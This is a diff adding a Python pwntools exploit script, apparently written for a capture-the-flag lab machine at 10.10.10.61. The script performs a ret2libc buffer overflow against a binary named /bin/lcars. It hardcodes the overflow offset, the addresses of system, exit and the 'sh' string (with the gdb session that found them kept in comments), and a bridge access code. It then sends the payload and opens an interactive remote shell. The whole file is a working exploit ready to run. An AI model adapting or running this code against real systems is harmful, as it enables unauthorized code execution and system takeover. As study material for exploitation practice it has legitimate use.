@@ -1,0 +1,66 @@
+#!/usr/bin/python3
+# coding:utf-8
+
+from pwn import *
+
+def def_handler(sig,frame):
+	print("\n[!]Saindo...\n")
+	sys.exit(1)
+
+# Ctrl + C
+signal.signal(signal.SIGINT,def_handler)
+
+# Variables_global
+
+offset = 212
+
+# for i in $(seq 1 50); do ldd /bin/lcars | grep "libc.so.6" | grep -oP "\(.*?\)" | tr -d "()"; done
+
+# (gdb) info function
+# (gdb) b *main
+# Breakpoint 1 at 0xc91
+# (gdb) r
+# Starting program: /bin/lcars 
+# Breakpoint 1, 0x56555c91 in main ()
+# (gdb) p system
+# $1 = {<text variable, no debug info>} 0xf7e4c060 <system>
+# (gdb) p exit
+# $2 = {<text variable, no debug info>} 0xf7e3faf0 <exit>
+# (gdb) find &system,+9999999,"sh"
+# 0xf7f6ddd5
+# 0xf7f6e7e1
+# 0xf7f70a14
+# 0xf7f72582
+# warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
+# 4 patterns found.
+# (gdb) x/s 0xf7f6ddd5
+# 0xf7f6ddd5:	"sh"
+
+host = '10.10.10.61'
+port = 32812
+
+def bufferOver():
+
+	junk = b'A' * offset
+	# ldd = 0xf7e32000
+	system_add = p32(0xf7e4c060)
+	exit_add = p32(0xf7e3faf0)
+	sh_add = p32(0xf7f6ddd5)
+
+	payload = junk + system_add + exit_add + sh_add
+
+	context(os='linux', arch='i386')
+
+	r = remote(host,port)
+
+	r.recvuntil(b"Enter Bridge Access Code:")
+	r.sendline(b"picarda1")
+	r.recvuntil(b"Waiting for input:")
+	r.sendline(b"4")
+	r.recvuntil(b"Enter Security Override:")
+	r.sendline(payload)
+
+	r.interactive()
+
+if __name__ == '__main__':
+	bufferOver()
